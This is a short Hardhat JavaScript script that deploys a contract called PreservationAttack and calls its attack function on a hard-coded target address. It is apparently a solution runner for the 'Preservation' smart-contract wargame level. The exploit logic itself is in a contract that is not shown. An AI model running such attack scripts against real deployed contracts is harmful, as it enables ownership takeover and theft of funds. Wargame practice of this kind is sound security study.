const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0xDbe1E73697392a65f1A163df94B43Bd77fDB8bBd";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const AttackContract = await ethers.getContractFactory("PreservationAttack");
  const attackContract = await AttackContract.deploy();

  // Attack

  let tx = await attackContract.attack(instanceAddress, { gasLimit: 200000 });
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
